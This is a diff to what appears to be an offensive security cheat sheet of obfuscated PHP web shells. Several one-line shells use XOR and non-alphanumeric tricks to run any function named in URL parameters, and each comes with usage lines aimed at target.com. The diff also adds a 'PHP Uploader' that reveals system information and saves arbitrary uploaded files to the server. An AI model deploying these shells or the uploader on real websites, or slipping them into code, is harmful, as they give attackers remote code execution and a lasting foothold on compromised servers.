@@ -45,7 +45,7 @@ description: Several list of simple and obfuscate PHP shell
 
 #### Non-alphanumeric obfuscation PHP Web Shell
 
-```
+```php
 <?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?> <?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
 
 [*] Usage: http://target.com/path/to/shell.php?_=function&__=argument
@@ -54,7 +54,7 @@ description: Several list of simple and obfuscate PHP shell
 
 #### Another Example Obfuscation of Simple PHP Webshell
 
-```
+```php
 <?php $_=${'_'.('{{{' ^ '<>/')};$_[0]($_[1]); ?>
 <?php $_=${'_'.('{'^'<').('{'^'>;').('{'^'/')};$_[0]($_[1]); ?>
 
@@ -64,7 +64,7 @@ description: Several list of simple and obfuscate PHP shell
 
 **in case if some functions like system,exec,etc. are disabled we can use var\_dump or print\_r for print output some function:**
 
-```
+```php
 <?php $_=${'_'.('{{{' ^ '<>/')};$_[0]($_[1]($_[2])); ?>
 <?php $_=${'_'.('{'^'<').('{'^'>;').('{'^'/')};$_[0]($_[1]($_[2])); ?>
 
@@ -76,7 +76,7 @@ description: Several list of simple and obfuscate PHP shell
 
 #### Without Space Obfuscation PHP Web Shell
 
-```
+```php
 <?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]);?>
 
 [*] Usage: http://target.com/path/to/shell.php?0=function&1=argument
@@ -85,7 +85,7 @@ description: Several list of simple and obfuscate PHP shell
 
 **in case if some functions like system,exec,etc. are disabled we can use var\_dump or print\_r for print output some function:**
 
-```
+```php
 <?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]($_[2]));?>
 
 [*] Usage: http://target.com/path/to/shell.php?0=function1&1=function2&2=argument
@@ -94,7 +94,7 @@ description: Several list of simple and obfuscate PHP shell
 
 #### Without Space and Non-alphanumeric Obfuscation PHP Web Shell
 
-```
+```php
 <?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']);?>
 
 [*] Usage: http://target.com/path/to/shell.php?__=function&___=argument
@@ -103,12 +103,21 @@ description: Several list of simple and obfuscate PHP shell
 
 **in case if some functions like system,exec,etc. are disabled we can use var\_dump or print\_r for print output some function:**
 
-```
+```php
 <?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']($_['____']));?>
 
 [*] Usage: http://target.com/path/to/shell.php?__=function1&___=function2&____=argument
 [*] E.g.: http://target.com/path/to/shell.php?__=var_dump&___=scandir&____=/
 ```
+
+### PHP Uploader
+
+{% code overflow="wrap" %}
+```php
+<?php echo php_uname();echo '<br>';
+echo '<br>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Uploaded</b><br><br>'; }else { echo '<b>Upload Failed !!!</b><br><br>'; }}?>
+```
+{% endcode %}
 
 ### XOR Shell
 
